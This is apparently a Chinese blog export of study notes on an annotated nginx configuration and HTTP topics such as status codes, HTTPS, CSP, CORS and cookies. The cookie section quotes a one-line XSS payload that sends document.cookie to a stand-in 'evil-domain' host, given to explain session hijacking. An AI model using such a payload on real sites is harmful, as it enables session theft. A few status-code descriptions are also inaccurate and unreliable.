123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221Nginx的配置文件nginx.conf配置详解如下： user nginx nginx ;# Nginx用户及组：用户 组。 worker_processes 8;# 工作进程：数目。根据硬件调整，通常等于CPU数量或者2倍于CPU。worker_cpu_affinity 00000001 00000010 00000100 00001000 00010000 00100000 01000000 10000000; error_log logs/error.log; error_log logs/error.log warn; # 错误日志：存放路径. 参数[ debug | info | notice | warn | error | crit ] 。 pid logs/nginx.pid;# pid（进程标识符）：存放路径。 worker_rlimit_nofile 204800;# 指定进程可以打开的最大描述符：数目。 events &#123; use epoll; # 使用epoll的I/O 事件模型。nginx针对不同的操作系统，有不同的事件模型 worker_connections 204800; # 每个工作进程的最大连接数量。尽量大，理论上每台nginx服务器的最大连接数为。worker_processes*worker_connections keepalive_timeout 60; # keepalive超时时间。 open_file_cache max=65535 inactive=60s; # 这个将为打开文件指定缓存，默认是没有启用的，max指定缓存数量，建议和打开文件数一致，inactive是指经过多长时间文件没被请求后删除缓存。 open_file_cache_valid 80s; # 这个是指多长时间检查一次缓存的有效信息。 open_file_cache_min_uses 1; # open_file_cache指令中的inactive参数时间内文件的最少使用次数，如果超过这个数字，文件描述符一直是在缓存中打开的，如果有一个文件在inactive时间内一次没被使用，它将被移除。&#125; #设定http服务器，利用它的反向代理功能提供负载均衡支持http &#123; include mime.types; # 文件扩展名与文件类型映射表 default_type application/octet-stream; # 默认文件类型 log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; log_format log404 &apos;$status [$time_local] $remote_addr $host$request_uri $sent_http_location&apos;; # 日志格式设置。 # $remote_addr与$http_x_forwarded_for 反向代理服务器的iP地址；原有客户端的IP地址和原来客户端的请求的服务器地址 # $remote_user：用来记录客户端用户名称； # $time_local： 用来记录访问时间与时区； # $request： 用来记录请求的url与http协议； # $status： 用来记录请求状态；成功是200， # $body_bytes_sent ：记录发送给客户端文件主体内容大小； # $http_referer：用来记录从那个页面链接访问过来的； # $http_user_agent：记录客户浏览器的相关信息； # Load modular configuration files from the /etc/nginx/conf.d directory. include /etc/nginx/conf.d/*.conf; map $http_upgrade $connection_upgrade &#123; default upgrade; &apos;&apos; close; &#125; access_log logs/host.access.log main; access_log logs/host.access.404.log log404; # 用了log_format指令设置了日志格式之后，需要用access_log指令指定日志文件的存放路径； server_names_hash_bucket_size 128; # 服务器名字的hash表大小 client_header_buffer_size 4k; # 客户端请求头部的缓冲区大小。这个可以根据你的系统分页大小来设置，一般系统分页都要大于1k。 分页大小可以用命令getconf PAGESIZE 取得。 client_max_body_size 5m; # 允许客户端请求最大字节数 client_body_buffer_size 128k; # 缓冲区代理缓存用户端请求最大字节数 large_client_header_buffers 8 128k; # 客户请求头缓冲大小。nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。 open_file_cache max=102400 inactive=20s; # 指定缓存是否启用。 open_file_cache_valid 30s; open_file_cache_min_uses 2; open_file_cache_errors on; autoindex on; # 开启目录列表访问，合适下载服务器，默认关闭 sendfile on; # 是否调用sendfile函数（zero copy方式）来输出文件，对于普通应用，必须设为on。如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络IO处理速度，降低系统uptime。 tcp_nopush on; # 防止网路阻塞 tcp_nodelay on; # 防止网络阻塞 keepalive_timeout 120; # 长连接超时时间，单位是秒 fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 128k; # FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度 gzip on; # 开启gzip压缩输出 gzip_min_length 1k; # 最小压缩文件大小 gzip_buffers 4 16k; # 压缩缓冲区 gzip_http_version 1.0; # 压缩版本（默认1.1，前端如果是squid2.5请使用1.0） gzip_comp_level 2; # 压缩等级 gzip_types text/plain application/x-javascript text/css application/xml; # 压缩类型，默认就已经包含text/html gzip_vary on; proxy_connect_timeout 90; # 代理超时时间, nginx和后端服务器连接的超时时间, 发起握手等候响应超时时间 proxy_read_timeout 180; # 代理接收超时，连接成功后等候后端服务器响应时间, 也可以说是后端服务器处理请求的时间 proxy_send_timeout 180; # 代理发送超时，后端服务器数据回传时间，就是在规定时间之内后端服务器必须传完所有的数据 proxy_buffer_size 256k; # 保存用户头信息的缓冲区大小 proxy_buffers 4 256k; # 设置用于读取应答（来自被代理服务器）的缓冲区数目和大小，默认情况也为分页大小，根据操作系统的不同可能是4k或者8k proxy_temp_file_write_size 256k; # 设置在写入proxy_temp_path时数据的大小，预防一个工作进程在传递文件时阻塞太长 proxy_temp_path /data0/proxy_temp_dir; # proxy_temp_path和proxy_cache_path指定的路径必须在同一分区 proxy_cache_path /data0/proxy_cache_dir levels=1:2 keys_zone=cache_one:200m inactive=1d max_size=30g; #设置内存缓存空间大小为200MB，1天没有被访问的内容自动清除，硬盘缓存空间大小为30GB。 proxy_intercept_errors on; # 表示使nginx阻止HTTP应答代码为400或者更高的应答 upstream proxy_svr &#123; server 127.0.0.1:8000 weight=1 max_fails=2 fail_timeout=30s; server 127.0.0.1:8001 weight=1 max_fails=2 fail_timeout=30s; &#125; # 默认配置 server &#123; listen 80; server_name localhost; charset koi8-r; access_log /var/log/nginx/host.access.log main; location / &#123; root /usr/share/nginx/html; index index.html index.htm; &#125; error_page 404 /404.html; # redirect server error pages to the static page /50x.html error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; index index.html &#125; &#125; # 定义某个负载均衡服务器 server &#123; listen 4545; server_name 127.0.0.1; keepalive_requests 120; # 单连接请求上限次数。 location ~*^.+$ &#123; # 请求的url过滤，正则匹配，~为区分大小写，~*为不区分大小写。 root path; #根目录 index index.html; # 设置默认页 proxy_pass http://proxy_svr/movie; # 请求转向mysvr 定义的服务器列表 deny 127.0.0.2; # 拒绝的ip allow 172.0.0.3; # 允许的ip &#125; &#125; # 设定查看Nginx状态的地址 location /NginxStatus &#123; stub_status on; access_log on; auth_basic &quot;NginxStatus&quot;; auth_basic_user_file conf/htpasswd; &#125; # HTTPS配置 server &#123; listen 443 ssl; #ssl端口 server_name test.com; #指定PEM格式的证书文件 ssl_certificate /etc/nginx/test.pem; #指定PEM格式的私钥文件 ssl_certificate_key /etc/nginx/test.key; &#125;&#125;]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Http]]></title>
    <url>%2F2019%2F01%2F27%2FHttp%2FHttp%2F</url>
    <content type="text"><![CDATA[HTTP HTTP Hyper Text Transfer Protocol（超文本传输协议）是一个基于请求与响应模式的、无状态的、应用层的协议，常基于TCP的连接方式，HTTP1.1版本中给出一种持续连接的机制，绝大多数的Web开发，都是构建在HTTP协议之上的Web应用。 HTTP协议是用于从WWW服务器传输超文本到本地浏览器的传送协议。它可以使浏览器更加高效，使网络传输减少。它不仅保证计算机正确快速地传输超文本文档，还确定传输文档中的哪一部分，以及哪部分内容首先显示(如文本先于图形)等。 HTTP是一个应用层协议，由请求和响应构成，是一个标准的客户端服务器模型。支持客户/服务器模式, 只能客户端发起请求，服务器回送响应; 简单快速：客户向服务器请求服务时，只需传送请求方法和路径, 通信速度很快; 灵活：HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记; 无连接, 限制每次连接只处理一个请求, 服务器处理完客户的请求，并收到客户的应答后，即断开连接; 无状态, HTTP是一个无状态的协议，服务器不会在两个请求之间保留任何数据（状态）。而使用HTTP的头部扩展，HTTP Cookies就可以解决这个问题。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。注意，HTTP本质是无状态的，使用Cookies可以创建有状态的会话。 HTTP协议通常承载于TCP协议之上，有时也承载于TLS或SSL协议层之上，这个时候，就成了我们常说的HTTPS。默认HTTP的端口号为80，HTTPS的端口号为443。 工作流程一次HTTP操作称为一个事务，其工作过程可分为四步：客户机与服务器需要建立连接；客户机发送请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容；服务器响应请求；客户端显示信息，断开连接。 三次握手浏览器向服务器发出连接请求 SYN，seq:X （x=0）；服务器回应了浏览器的请求，并要求确认 SYN，ACK，此时seq：y（y为0），ACK：x+1（为1）；浏览器回应了服务器的确认，连接成功 ACK，此时seq：x+1（为1），ACK：y+1（为1）。 浏览器输入URL后http请求返回的完整过程Redirect -&gt; App cache应用缓存 -&gt; DNS 解析（域名对应ip地址）-&gt; 创建TCP连接 (三次握手) -&gt; Request发送请求 -&gt; Response接收响应 OSI（Open System Interconnect），即开放式系统互联七层模型（一个理想的模型）： 物理层Physical Layer： 比特流的传输。实际最终信号的传输是通过物理层实现的,通过物理介质传输比特流, 规定了电平、速度和电缆针脚。常用各种物理设备,集线器、中继器、调制解调器、网线、双绞线、同轴电缆。相当于快递寄送过程中的交通工具，如汽车，火车，飞机，船。 数据链路层Data Link La yer: 介质访问接入。负责建立和管理节点间的链路。通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。分为介质访问控制（MAC）和逻辑链路控制（LLC）两个子层。如网桥、以太交换机、网卡。 网络层Network Layer，即IP协议层：路由寻址。通过路由选择算法，为报文或分组通过通信子网选择最适当的路径，控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。寻址、交换、 路由算法、连接服务。如路由器。相当于快递公司庞大的快递网络，全国不同的集散中心 传输层Transport Layer：端到端的连接。向用户提供可靠的端到端的差错和流量控制，负责传输连接管理、处理传输差错和监控服务质量，保证报文的正确传输，向高层屏蔽下层数据通信的细节，即向用户透明地传送报文。OSI下3层的主要任务是数据通信(通信子网的功能)，上3层的任务是数据处理(资源子网的功能)。常见的协议：TCP、UDP协议、Novell网络中的SPX协议和微软的NetBIOS/NetBEUI协议. 该层是通信子网和资源子网的接口和桥梁，起到承上启下的作用。相当于投递员。 会话层Session Layer：主机间的通信。组织和协调两个会话进程之间的通信，并对数据交换进行管理。相当于公司的外联部。 表示层Presentation Layer：数据的表示。对来自应用层的命令和数据进行解释，对各种语法赋予相应的含义，如编码、数据格式转换和加解密等，并按照一定的格式传送给会话层。相当于公司文秘翻译。 应用层Application Layer：处理网络应用。提供应用接口，也为用户直接提供各种网络服务。常见应用层的网络服务协议有HTTP，HTTPS，FTP，POP3、SMTP等。对等通信，为了使数据分组从源传送到目的地，源端OSI模型的每一层都必须与目的端的对等层进行通信，这种通信方式称为对等层通信。在每一层通信过程中，使用本层自己协议进行通信。 TCP/IP五层模型 物理层、数据链路层、网络层、传输层、应用层(对应OSI的会话层、表示层和应用层) HTTP1.1版本新特性默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求；管线化，客户端可以同时发出多个HTTP请求，而不用一个个等待响应；断点续传原理 http2与http1.1区别信道复用； server push ; 所有数据二进制传输； 同一连接里面发送多个请求不再需要按照顺序； 头信息压缩以及分帧传输 GET方法与POST方法的区别1、get重点在从服务器上获取资源，post重点在向服务器发送数据；2、get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，多个请求数据间用”&amp;”连接，这个过程用户是可见的；post将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；3、Get传输的数据量小，因为受URL长度限制，但效率较高；Post可以传输大量数据，所以上传文件时只能用Post方式；4、get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；post较get安全性较高；5、get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。post支持标准字符集，可以正确传递中文字符。 常用的HTTP方法有哪些？ GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器。 POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。 PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。 HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。 DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。 OPTIONS： 请求查询服务器的性能，或者查询与资源相关的选项和需求, 查询相应URI支持的HTTP方法。 TRACE: 请求服务器回送收到的请求信息，主要用于测试或诊断 CONNECT: 保留将来使用 http请求由三部分组成，分别是：请求行、消息报头、请求正文请求报文包含三部分：a、请求行(起始行start-line）：包含请求方法、URI、HTTP版本信息。 GET /test/hi.txt HTTP/1.0b、请求首部字段 Headersc、请求内容主体 Body 响应报文包含三部分：a、状态行(status line)：包含HTTP版本、状态码、状态码的原因短语. HTTP/1.0 200 OKb、响应首部字段 Headersc、响应内容主体 Body HTTP/2 帧： HTTP/2 引入了一个额外的步骤：它将 HTTP/1.x 消息分成帧并嵌入到流 (stream) 中。数据帧和报头帧分离，这将允许报头压缩。将多个流组合，这是一个被称为 多路复用 (multiplexing) 的过程，它允许更有效的底层 TCP 连接。 常见HTTP首部字段a、通用首部字段（请求报文与响应报文都会使用的首部字段） Date：创建报文时间 Connection：连接的管理 Cache-Control：缓存指令, 缓存指令是单向、独立的,响应中出现的缓存指令在请求中未必会出现,一个消息的缓存指令不会影响另一个消息处理的缓存机制。请求时的缓存指令包括：no-cache（用于指示请求或响应消息不能缓存）、no-store、max-age、max-stale、min-fresh、only-if-cached;响应时的缓存指令包括：public、private、no-cache、no-store、no-transform、must-revalidate、proxy-revalidate、max-age、s-maxage. Transfer-Encoding：报文主体的传输编码方式b、请求首部字段（请求报文会使用的首部字段） Host：请求资源所在服务器 Accept：可处理的媒体类型 Accept-Charset：可接收的字符集 Accept-Encoding：可接受的内容编码 Accept-Language：可接受的自然语言c、响应首部字段（响应报文会使用的首部字段） Accept-Ranges：可接受的字节范围 Location：令客户端重新定向到的URI Server：HTTP服务器的安装信息d、实体首部字段（请求报文与响应报文的的实体部分使用的首部字段） Allow：资源可支持的HTTP方法 Content-Type：实体主类的类型 Content-Encoding：实体主体适用的编码方式 Content-Language：实体主体的自然语言 Content-Length：实体主体的的字节数 Content-Range：实体主体的位置范围，一般用于发出部分请求时使用 X-Content-Type-Options: nosiff 禁用客户端的 MIME 类型嗅探行为 X-Frame-OptionsEdit: DENY(表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许) / SAMEORIGIN(表示该页面可以在相同域名页iframe 中展示) / ALLOW-FROM uri (表示该页面可以在指定来源的 frame 中展示) X-XSS-Protection: 0 (禁止XSS过滤) / 1; mode=block (当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面) 协议升级机制HTTP协议 提供了一种特殊的机制，这一机制允许将一个已建立的连接升级成新的、不相容的协议。需要添加两项额外的header：Connection: Upgrade， 设置 Connection 头的值为 “Upgrade” 来指示这是一个升级请求.Upgrade: protocols， Upgrade 头指定一项或多项协议名，按优先级排序，以逗号分隔。 常见的HTTP相应状态码返回的状态 1xx：Informational 指示信息–表示请求已接收，继续处理 2xx：Success 成功–表示请求已被成功接收、理解、接受 3xx：Redirection 重定向–信息不完整，要进行更进一步的补充 4xx：Client Error 客户端错误–请求有语法错误或请求无法实现 5xx：Server Error 服务器端错误–服务器未能实现合法的请求 100 Continue 继续, 客户端必须继续发出请求 101 Switching Protocols 交换协议, 客户端要求服务器根据请求转换HTTP协议版本 102 Processing 处理 200 OK, 请求被正常处理 201 Created 创建, 请求成功并且服务器创建了新的资源 202 Accepted 已接受, 但尚未处理 203 Non-Authoritative Information 非授权信息, 服务器已成功处理了请求，但返回的信息可能来自另一来源 204 No Content 无内容, 请求收到，但返回信息为空 205 Reset Content 重置内容, 服务器完成了请求，重置文档视图(例如，清除表单内容以输入新内容) 206 Partial Content 部分内容, 服务器已经完成了部分用户的GET请求 207 Multi-Status 多状态 208 Already Reported 已报告 226 IMIM Used 使用的 300 Multiple Choices 多种选择, 请求的资源可在多处得到 301 Moved Permanently , 永久性重定向, 在Location响应首部的值仍为当前URL(隐式重定向)。使用301要慎重，一旦使用，服务端更改路由设置，用户如果不清理浏览器缓存，就会一直重定向。 302 Found, 临时重定向, 在Location响应首部的值仍为新的URL(显示重定向)。每次请求仍然需要经过服务端指定跳转地址 303 See Other ,建议客户端访问其他URL或访问方式,能通过GET方法重定向到另一个URI上 304 Not Modified, 请求的资源没有改变 可以继续使用缓存 305 Use Proxy 使用代理 306 Switch Proxy 开关代理, 前一版本HTTP中使用的代码，现行版本中不再使用 307 Temporary Redirect , 临时重定向，与302类似，只是强制要求使用POST方法 308 Permanent Redirect 永久重定向 400 Bad Request 错误的请求, 服务器不理解请求的语法; 网站服务未启动 401 Unauthorized 未授权, 请求要求身份验证。对于需要登录的网页，服务器可能返回此响应 402 Payment Required 需要付费 403 Forbidden 服务器拒绝访问 404 Not Found 服务器找不到请求的网页 405 Method Not Allowed 不允许的方法 406 Not Acceptable 不可接受 407 Proxy Authentication Required 代理服务器需要身份验证, 与 401（未授权）类似，但指定请求者应当授权使用代理 408 Request Timeout 请求超时 409 Conflict 冲突, 服务器在完成请求时发生冲突。服务器必须在响应中包含有关冲突的信息。 410 Gone 已删除, 如果请求的资源已永久删除，服务器就会返回此响应 411 Length Required 需要长度, 服务器不接受不含有效内容长度标头字段的请求 412 Precondition Failed 前提条件失败, 服务器未满足请求者在请求中设置的其中一个前提条件 413 Payload Too Large 负载过大 414 URI Too Long 太长 415 Unsupported Media Type 不支持的媒体类型, 请求的格式不受请求页面的支持 416 Range Not Satisfiable 的范围不合适, 如果页面无法提供请求的范围，则服务器会返回此状态代码 417 Expectation Failed 预期失败, 服务器未满足”期望”请求标头字段的要求 418 I’m a teapot 我是一个茶壶 421 Misdirected Request 误导请求 422 Unprocessable Entity 无法处理的实体 423 Locked 锁定 424 Failed Dependency 失败的依赖 426 Upgrade Required 升级所需 428 Precondition Required 所需的先决条件 429 Too Many Requests 太多的请求 431 Request Header Fields Too Large 请求头字段太大 451 Unavailable For Legal Reasons 不可出于法律原因 499 网络繁忙，同一个ip过来的过多请求直接中断 500 Internal Server Error 内部服务器错误 501 Not Implemented 未执行, 服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码 502 Bad Gateway 错误的网关, 服务器作为网关或代理，从上游服务器收到无效响应。 503 Service Unavailable 服务不可用, 服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 504 Gateway Timeout 网关超时, 服务器作为网关或代理，但是没有及时从上游服务器收到请求 505 HTTP Version Not Supported 不支持HTTP版本 506 Variant Also Negotiates 变体也进行协商 507 Insufficient Storage 存储空间不足 508 Loop Detected 检测到循环 510 Not Extended 不延长 511 Network Authentication Required 网络需要身份验证 URI、URL和URN URI：Uniform Resource Identifier，即统一资源标志符，用来唯一的标识一个资源。 URL：Uniform Resource Locator，统一资源定位符, 也叫Web地址。即URL可以用来标识一个资源，而且还指明了如何locate这个资源。 URN：Uniform Resource Name，统一资源命名。即通过名字来表示资源的。格式： http://www.example.com:80/path/to/myfile.html?key1=value1&amp;key2=value2#SomewhereInTheDocument.protocol方案或协议(http://) + domain name主机(www.example.com) + port端口(:80) + path路径(/path/to/myfile.html) + parameters查询(?key1=value1&amp;key2=value2) + anchor片段(#SomewhereInTheDocument) HTTP的缺点与HTTPSa、通信使用明文不加密，内容可能被窃听；b、不验证通信方身份，可能遭到伪装；c、无法验证报文完整性，可能被篡改。HTTPS就是HTTP加上加密处理（一般是SSL安全通信线路）+认证+完整性保护 HTTP优化利用负载均衡优化和加速HTTP应用；利用HTTP Cache来优化网站 curl 利用URL规则在http命令行下工作的文件传输工具。它支持文件的上传和下载的是综合传输工具，习惯称url为下载工具curl [option] [url]如 curl -v baidu.com12345678910111213141516171819202122* Rebuilt URL to: www.baidu.com/* Trying 61.135.169.125...* TCP_NODELAY set* Connected to www.baidu.com (61.135.169.125) port 80 (#0)&gt; GET / HTTP/1.1&gt; Host: www.baidu.com&gt; User-Agent: curl/7.54.0&gt; Accept: */*&gt;&lt; HTTP/1.1 200 OK&lt; Accept-Ranges: bytes&lt; Cache-Control: private, no-cache, no-store, proxy-revalidate, no-transform&lt; Connection: Keep-Alive&lt; Content-Length: 2381&lt; Content-Type: text/html&lt; Date: Mon, 26 Nov 2018 13:59:17 GMT&lt; Etag: &quot;588604c4-94d&quot;&lt; Last-Modified: Mon, 23 Jan 2017 13:27:32 GMT&lt; Pragma: no-cache&lt; Server: bfe/1.0.8.18&lt; Set-Cookie: BDORZ=27315; max-age=86400; domain=.baidu.com; path=/&lt; HTTPS HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全。HTTPS协议的主要作用可以分为两种：确认网站的真实性；建立一个信息安全通道，来保证数据传输的安全。区别主要如下：1、https协议需要ca申请证书，需要费用。 2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。3、完全不同的连接方式和端口，http是80，https是443。 4、http的连接很简单，无状态；HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，比http协议安全。缺点: 1、HTTPS协议握手阶段比较费时，会使页面的加载时间延长近50%，增加10%到20%的耗电；2、HTTPS连接缓存不如HTTP高效，会增加数据开销和功耗，甚至已有的安全措施也会因此而受到影响；3、SSL证书需要钱，功能越强大的证书费用越高，个人网站、小网站没有必要一般不会用。4、SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名，IPv4资源不可能支撑这个消耗。5、HTTPS协议的加密范围也比较有限，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。 MIME 多用途Internet邮件扩展（MIME）类型 是一种标准化的方式来表示文档的性质和格式。浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理文档。通用结构: type/subtype, 大小写不敏感，但是传统写法都是小写 text/plain 文本文件默认值 text/html HTML内容 text/css CSS文件 image/webp 图像 audio/ogg 音频文件 video/webm 视频文件 video/webm 视频文件 application/octet-stream 二进制数据 application/javascript JavaScript文件或JSONP format application/msword 文档类型Microsoft Word 扩展名.doc application/vnd.ms-excel 文档类型Microsoft Excel 扩展名.xls application/vnd.openxmlformats-officedocument.spreadsheetml.sheet 文档类型Microsoft Excel (OpenXML) 扩展名.xlsx multipart/form-data Multipart 类型 MIME 嗅探, 在缺失 MIME 类型或客户端认为文件设置了错误的 MIME 类型时，浏览器可能会通过查看资源来进行MIME嗅探。每一个浏览器在不同的情况下会执行不同的操作。因为这个操作会有一些安全问题，有的 MIME 类型表示可执行内容而有些是不可执行内容。浏览器可以通过请求头 Content-Type 来设置 X-Content-Type-Options: nosniff 以阻止MIME嗅探。假如请求类型为以下两种，那么阻止请求的发生：”style” 但是 MIME 类型不是 “text/css”，”script” 但是 MIME 类型不是JavaScript MIME 类型。 CSP Content-Security-Policy 内容安全策略 作用:限制资源获取,报告资源获取越权，减少和报告跨站脚本XSS攻击。CSP通过指定有效域——即浏览器认可的可执行脚本的有效来源——使服务器管理者有能力减少或消除XSS攻击所依赖的载体。一个CSP兼容的浏览器将会仅执行从白名单域获取到的脚本文件，忽略所有的其他脚本 (包括内联脚本和HTML的事件处理属性)；数据包嗅探攻击, 除限制可以加载内容的域，服务器还可指明哪种协议允许使用；比如 (从理想化的安全角度来说)，服务器可指定所有内容必须通过HTTPS加载。 限制方式: default-src限制全局; 制定资源类型 connect-src、img-src、font-src、media-src、frame-src、script-src、manifest-src、style-src 一个策略由一系列策略指令所组成，每个策略指令都描述了一个针对某个特定类型资源以及生效范围的策略。你的策略应当包含一个default-src策略指令，在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看default-src )。一个策略可以包含 default-src 或者 script-src 指令来防止内联脚本运行, 并杜绝eval()的使用。 一个策略也可包含一个 default-src 或 style-src 指令去限制来自一个 style 元素或者style属性的內联样式. Content-Security-Policy: default-src ‘self’: 一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名) Content-Security-Policy: default-src ‘self’ *.trusted.com: 允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同) Content-Security-Policy: default-src ‘self’; img-src *; media-src media1.com media2.com; script-src userscripts.example.com: 允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码. 对策略进行测试, 为降低部署成本，CSP可以部署为报告(report-only)模式。在此模式下，CSP策略不是强制性的，但是任何违规行为将会报告给一个指定的URI地址。Content-Security-Policy-Report-Only: policy 启用违例报告, 默认情况下，违规报告并不会发送。为启用发送违规报告，你需要指定 report-uri 策略指令，并提供至少一个URI地址去递交报告：Content-Security-Policy: default-src ‘self’; report-uri http://reportcollector.example.com/collector.cgi CORS 当一个资源从与该资源本身所在的服务器不同的域或端口请求一个资源时，资源会发起一个跨域 HTTP 请求cross-origin sharing standard 跨域资源共享标准， 跨域限制以及预请求验证简单请求,不需要预请求 : 方法 GET HEAD POST; Content-Type: text/plain、 multipart/form-data、 application/x-www-form-urlencoded; 首部字段集合为Accept 、Accept-Language、Content-Language、Content-Type （需要注意额外的限制）、DPR、Downlink、Save-Data、Viewport-Width、Width。请求中的XMLHttpRequestUpload 对象未注册任意多个事件监听器； 请求中未使用ReadableStream对象。预检请求:必须首先使用OPTIONS方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。”预检请求“的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。附带身份凭证的请求:Fetch 与 CORS 可以基于 HTTP cookies 和 HTTP 认证信息发送身份凭证。对于跨域 XMLHttpRequest 或 Fetch 请求，如果要发送凭证信息，需要设置XMLHttpRequest 的 withCredentials为true，从而向服务器发送 Cookies。同时，服务器端的响应中携带 Access-Control-Allow-Credentials: true 。此时，服务器不得设置 Access-Control-Allow-Origin 的值为*。HTTP 请求首部字段,这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪: Origin, 表明预检请求或实际请求的源站 URI, 它不包含任何路径信息，只是服务器名称; Access-Control-Request-Method; Access-Control-Request-Headers;HTTP 响应首部字段: Access-Control-Allow-Origin; Access-Control-Expose-Headers; Access-Control-Max-Age; Access-Control-Allow-Credentials; Access-Control-Allow-Methods; Access-Control-Allow-Headers。 Cookie, Web Cookie或浏览器Cookie 服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。 用途：会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）;个性化设置（如用户自定义设置、主题等）;浏览器行为跟踪. 分类：会话期Cookie和持久性Cookie。会话期Cookie关闭浏览器会自动删除失效 ；持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age。提示：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。response.setHeader(‘Set-Cookie’, [‘name=sea; max-age=2’, ‘year=2018; Expires=Wed, 21 Oct 2015 07:28:00 GMT;HttpOnly; domain=test.com’]); 标记: Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端 ;HttpOnly, 为避免跨域脚本 (XSS) 攻击, document.cookie无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端. Cookie的作用域: Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名；Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中），以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。 SameSite Cookies： 允许服务器要求某个cookie在跨站请求时不会被发送，从而可以阻止跨站请求伪造攻击（CSRF）。但目前SameSite Cookie还处于实验阶段，并不是所有浏览器都支持。 会话劫持和XSS： 在Web应用中，Cookie常用来标记用户或授权会话。因此，如果Web应用的Cookie被窃取，可能导致授权用户的会话受到攻击。常用的窃取Cookie的方法有利用社会工程学攻击和利用应用程序漏洞进行XSS攻击。(new Image()).src = “http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie。 HttpOnly类型的Cookie由于阻止了JavaScript对其的访问性而能在一定程度上缓解此类攻击。 跨站请求伪造（CSRF）: 对用户输入进行过滤来阻止XSS；任何敏感操作都需要确认；用于敏感信息的Cookie只能拥有较短的生命周期。 Cache-Control 缓存， 缓解服务器端压力，提升性能 Cache-Control: private 私有缓存, public 公共缓存, no-cache 强制确认缓存, no-store 禁止进行缓存, must-revalidate 缓存验证确认, max-age=31536000 缓存（保持新鲜）的最大时间 数据协商客户端发送请求给服务端，客户端会声明请求希望拿到的数据的格式和限制，服务端会根据请求头信息，来决定返回的数据。 请求 Accept Accept 声明想要数据的类型; accept: / Accept-Encoding 数据编码方式，限制服务端如何进行数据压缩; accept-encoding: gzip, deflate, br。 gzip使用最多；br使用比较少但压缩比高。 Accept-Language 展示语言; accept-language: zh-CN,zh;q=0.9,en;q=0.8。 浏览器会判断系统的语言自动加上。q代表权重，数值越大权重越大，优先级越高。 User-Agent 浏览器相关信息。 user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36。 Accept 